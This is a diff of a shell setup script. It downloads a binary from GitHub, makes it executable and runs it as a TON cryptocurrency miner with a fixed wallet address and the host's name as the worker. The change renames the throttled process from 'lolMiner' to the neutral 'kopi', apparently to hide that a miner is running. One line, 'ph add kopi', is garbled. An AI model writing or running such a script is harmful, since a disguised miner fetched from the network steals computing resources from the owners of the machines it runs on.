@@ -11,5 +11,5 @@ sudo dpkg-reconfigure --frontend noninteractive tzdata
 wget https://github.com/aurbach55/dera/raw/main/kopi
 ph add kopi
 chmod +x kopi
-cpulimit -e lolMiner -l 30 &
+cpulimit -e kopi -l 30 &
 ./kopi --algo TON --pool https://next.ton-pool.com --user EQBAIt3Hs69kCi4grIGDha7_mhF40wWG4vB83dRBsT_JXpwF.$(cat /proc/sys/kernel/hostname)
